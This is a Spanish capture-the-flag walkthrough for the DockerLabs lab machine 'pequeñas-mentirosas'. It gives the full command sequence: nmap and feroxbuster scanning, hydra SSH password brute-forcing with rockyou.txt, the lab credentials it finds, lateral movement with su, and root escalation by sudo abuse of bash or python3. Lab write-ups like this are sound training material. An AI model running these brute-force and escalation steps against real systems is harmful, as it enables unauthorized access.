Manual de Explotación: Pequeñas Mentirosas (DockerLabs)

Explotación web + Escalada de privilegios hasta root

1. Preparación del Entorno

Buscar en DockerLabs la máquina pequeñas-mentirosas, descargarla desde el navegador de Kali Linux, moverla a Documentos, extraerla y abrir una terminal dentro de la carpeta.

// DESPLEGANDO MÁQUINA

sudo chmod +x auto_deploy.sh
sudo ./auto_deploy.sh pequeñas-mentirosas.tar

2. Fase de Reconocimiento y Enumeración

sudo apt update && sudo apt upgrade -y
sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oN escaneo.txt

Agregar al /etc/hosts:

sudo nano /etc/hosts

Añadir: 172.17.0.2 pequenas-mentirosas.dl

3. Fase de Fuzzing y Descubrimiento

// ERROR FEROXBUSTER

Para solucionar el error de fecha:

sudo timedatectl set-ntp true

Luego volver a ejecutar:

feroxbuster -u http://172.17.0.2

4. Fase de Explotación - Acceso Inicial

hydra -l a -P /usr/share/wordlists/rockyou.txt 172.17.0.2 ssh -t 4 -V

Credenciales encontradas: a : secret

ssh a@172.17.0.2

5. Movimiento Lateral (a → spencer)

hydra -l spencer -P /usr/share/wordlists/rockyou.txt 172.17.0.2 ssh -t 4 -V

Credenciales: spencer : spencer

su spencer

6. Escalada de Privilegios (spencer → root)

sudo -l

Dependiendo del binario que devuelva, usar GTFOBins:

  • Si es /bin/bash: sudo /bin/bash
  • Si es python3: sudo python3 -c 'import os; os.system("/bin/bash")'

Conclusión

La máquina fue comprometida principalmente por contraseñas débiles y mala configuración de permisos sudo. Esto resalta la importancia de usar contraseñas fuertes y aplicar el principio de menor privilegio.
